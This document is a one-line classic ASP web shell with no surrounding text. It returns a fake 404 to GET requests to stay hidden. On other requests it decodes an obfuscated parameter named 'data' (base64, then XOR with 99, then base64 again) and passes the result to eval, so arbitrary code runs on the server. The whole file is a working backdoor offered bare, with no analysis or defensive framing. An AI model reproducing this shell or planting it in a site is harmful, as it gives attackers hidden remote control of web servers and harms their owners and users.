<%if Request.ServerVariables("Request_Method")="GET" then:Response.Status="404":end if:Function b64d2(psText):dim ox, os, oNo:Set ox=Server.CreateObject("MSXML2.DOMDocument"):Set os=Server.CreateObject("ADODB.Stream"):Set oNo=ox.CreateElement("tNode"):oNo.dataType="bin.base64":oNo.Text=psText:os.Charset="gb2312":os.Type=1:os.Open():os.Write(oNo.nodeTypedValue):os.Position=0:os.Type=2:b64d2=os.ReadText(-1):os.Close:Set oNo=Nothing:Set os=Nothing:Set ox=Nothing:End Function:Public Function decode( byVal s ):if s=null or s="" or isempty(s) then:decode=s:Exit Function:end if:Dim r,i,t:r="":t=split(b64d2(s),"/"):For i=0 to ubound(t) - 1:r=r & (chr(cint(t(i)) xor 99)):Next:decode=b64d2(r):End Function:eval decode(Request("data"))%>